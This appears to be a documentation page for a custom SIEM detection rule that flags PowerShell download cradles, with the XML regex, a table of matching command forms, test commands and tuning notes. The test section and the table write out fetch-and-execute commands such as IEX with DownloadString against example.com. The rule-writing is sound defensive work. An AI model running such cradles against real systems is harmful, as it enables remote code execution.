# 100290 — PowerShell download cradle

| Field | Value |
|---|---|
| Rule ID | 100290 |
| Level | 13 |
| MITRE technique | [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/) |
| Tactic | TA0011 Command & Control / TA0002 Execution |
| Parent group | `sysmon_event1` (Sysmon EventID 1, process create) |
| Telemetry | Sysmon `Microsoft-Windows-Sysmon/Operational` |
| Status | 🟡 Deployed; Defender ASR preempts on hardened endpoints |

## Detection logic

```xml
<rule id="100290" level="13">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)\\powershell(_ise)?\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(iex|invoke-expression).{0,80}(new-object.{0,40}(net\.webclient|system\.net\.webclient)|invoke-webrequest|iwr|wget|curl|downloadstring|downloaddata|downloadfile)</field>
  <description>PowerShell download cradle.</description>
  <mitre><id>T1105</id><id>T1059.001</id></mitre>
</rule>
```

Detects the canonical `IEX (...download...)` pattern in its common forms:

| Form | Why it matches |
|---|---|
| `IEX (New-Object Net.WebClient).DownloadString('http://...')` | Classic Empire / PSEmpire pattern |
| `Invoke-Expression (Invoke-WebRequest http://...).Content` | Modern PS5+ equivalent |
| `iex (iwr http://...)` | Same, abbreviated |
| `IEX (wget http://...)` | PowerShell alias for Invoke-WebRequest |
| `IEX (curl http://...)` | Same |
| `IEX (...DownloadFile(...))` | File-to-disk variant |

The `.{0,80}` between `IEX` and the download verb tolerates whitespace, parentheses, type accelerators, and variable indirection without being so loose it false-positives.

## Stock-coverage check

Reviewed `0800-sysmon_id_1.xml`. Stock has rules for PowerShell-vs-SAM-hive (92023, 92024) and PowerShell-spawned cmd (92004) but no generic IEX-download-cradle detector. Custom rule fills a genuine gap.

## Test methodology

```powershell
# Canonical cradle test
IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')

# Modern variant
IEX (iwr http://example.com/test.ps1).Content
```

## Observed status

Rule deployed and parse-validated.

On Freddy-PC, Defender ASR and AMSI in-memory script blocking preempt the full execution. Expected behaviour:

1. Sysmon EventID 1 IS emitted for the powershell.exe process-create with the full command line preserved
2. The custom rule fires on the field match (this is the detection point — Sysmon captures the command line BEFORE ASR enforces the block)
3. The IEX of the downloaded content is then blocked by AMSI / ASR before the payload runs

So the *detection* should validate end-to-end on the process-create signal; what cannot be validated on Freddy-PC is the post-detection payload behaviour (which would be input to rules like 100210 if the payload uses encoded commands). Full payload-fetch validation pending the Range VM.

## Tuning notes

- **PowerShell EventID 4104 (script-block logging) would provide much stronger signal** — it captures the *decoded* payload after AMSI sees it. The Windows agent config does not currently ingest `Microsoft-Windows-PowerShell/Operational`. Adding it is tracked in [`../docs/roadmap.md`](../docs/roadmap.md)
- **False positives** — IT operators sometimes use `iwr` for legitimate scripted downloads. The `IEX (...)` anchor is the safety net: a benign `iwr http://... -OutFile x.zip` doesn't match because there's no IEX. The rule only fires when the output of the download is being executed
- **Stacks naturally with 100210** — an encoded download cradle should fire both rules

## Cross-references

- [`100210-ps-encoded.md`](./100210-ps-encoded.md) — companion for the encoded-payload variant
- [`100250-lolbin-abuse.md`](./100250-lolbin-abuse.md) — covers the non-PowerShell download paths (mshta, bitsadmin, etc.)
- [`../docs/findings.md`](../docs/findings.md) #1 — Defender ASR effect on testing
- [`../docs/roadmap.md`](../docs/roadmap.md) — PowerShell 4104 ingestion
